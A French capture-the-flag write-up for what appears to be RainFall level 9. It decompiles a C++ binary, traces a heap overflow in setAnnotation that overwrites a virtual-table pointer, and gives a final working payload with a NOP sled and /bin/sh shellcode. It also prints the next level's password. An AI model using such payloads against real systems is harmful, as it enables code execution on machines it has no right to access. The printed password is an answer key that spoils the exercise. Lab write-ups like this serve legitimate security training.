# level 9



Voici le code decompilé avec dogBolt (ghidra)
```
void main(int param_1,int param_2)
{
  N *this;
  undefined4 *this_00;
  if (param_1 < 2) {
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  this = (N *)operator_new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator_new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}

// N::N(int)
void __thiscall N::N(N *this,int param_1)

{
  *(undefined ***)this = &PTR_operator__08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}


void __thiscall N::setAnnotation(N *this,char *param_1)
{
  size_t __n;

  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}

int __thiscall N::operator+(N *this,N *param_1)

{
  return *(int *)(param_1 + 0x68) + *(int *)(this + 0x68);
}

int __thiscall N::operator-(N *this,N *param_1)

{
  return *(int *)(this + 0x68) - *(int *)(param_1 + 0x68);
}
```


Le programme fourni semble implémenter un certain nombre de fonctionnalités C++ manipulant des objets de type N. Voici une explication détaillée de chacune des parties du programme :

## Fonction main
La fonction principale du programme commence par vérifier si au moins un argument a été passé en ligne de commande (en excluant le nom du programme lui-même). Si ce n'est pas le cas, elle appelle _exit(1).

- param_1 représente le nombre d'arguments (argc).
- param_2 est un pointeur vers un tableau de chaînes de caractères (argv).

## Allocation et Initialisation des Objets N
Deux objets de type N sont créés et initialisés :

- this : Premier objet, alloué avec operator_new(0x6c) et initialisé avec une valeur de 5.
- this_00 : Deuxième objet, également alloué avec operator_new(0x6c) et initialisé avec une valeur de 6.

Après leur création, la fonction setAnnotation est appelée sur le premier objet this en passant le premier argument de ligne de commande (argv[1]). Cette méthode est utilisée pour définir une donnée membre de l'objet en copiant la chaîne de caractères passée en argument dans l'objet.

Ensuite, il y a un appel indirect de fonction via le deuxième objet this_00, qui semble utiliser un pointeur de fonction stocké dans ou avec l'objet (impliquant peut-être une table de méthodes virtuelles ou un comportement similaire).

## Classe N et ses Méthodes
Constructeur N::N(int)
Ce constructeur initialise les objets de type N :

- Il configure un pointeur (probablement un pointeur de table virtuelle) à une adresse fixe.
- Il stocke la valeur param_1 à un emplacement spécifique de l'objet (this + 0x68).

## Méthode setAnnotation(char*)
Cette méthode copie une chaîne de caractères dans l'objet, en commençant juste après le début de l'objet (à l'adresse this + 4). La longueur de la chaîne est déterminée par strlen, et il n'y a aucune vérification pour prévenir un dépassement de la taille allouée pour l'objet, ce qui représente une vulnérabilité de débordement de tampon.

## Surcharge des opérateurs + et -
Ces méthodes permettent l'addition et la soustraction des valeurs stockées dans les objets N. Elles accèdent directement à un entier stocké dans une position fixe de l'objet (this + 0x68) et effectuent l'opération demandée.

## Exploitation Potentielle
La vulnérabilité ici est l'utilisation non sécurisée de memcpy dans setAnnotation, qui permet un débordement de tampon si une chaîne trop longue est passée en argument. Cela peut être exploité pour écraser des données critiques du programme, y compris des pointeurs de fonction, permettant potentiellement l'exécution de code arbitraire.


## Detail de l'exploit

Nous allons mettre un breakpoint apres setAnnotation dans gdb et utiliser un script python qui ecris "aaaabbbb....YYYYZZZZ" dans la sortie. Ce qui nous permettra de voir ou nous pourrons ecraser les adresses de retour, et reorienter le code.

```
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax <-------------------------------------------
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
```

```
Starting program: /home/user/level9/level9 $(python /tmp/script.py)

Breakpoint 1, 0x0804867c in main ()
(gdb) i r
eax            0x804a00c        134520844
ecx            0x5a5a5a5a       1515870810
edx            0x804a0dc        134521052
ebx            0x804a078        134520952
esp            0xbffff640       0xbffff640
ebp            0xbffff668       0xbffff668
esi            0x0      0
edi            0x0      0
eip            0x804867c        0x804867c <main+136>
eflags         0x200283 [ CF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r
eax            0x42424242       1111638594
ecx            0x5a5a5a5a       1515870810
```

Nous constatons que eax pointait a l'adresse 0x804a00c puis 0x42424242 apres continuation.
Nous allons donc creer le payload suivant qui redirige le programme a l'adresse 0x804a00c et a cette adresse nous mettons l'adresse 0x804a018 pour rediriger dans notre nodSled et glisser jusqu'a notre shellcode.

Apres de nombreux tests d'alignement de memoire, voici le payload final.
```
level9@RainFall:~$ ./level9 $(python -c 'print "\x18\xa0\x04\x08" + "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A"*(108 - 30 - 23 -5) + "\x0c\xa0\x04\x08"')

$ whoami
bonus0

$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

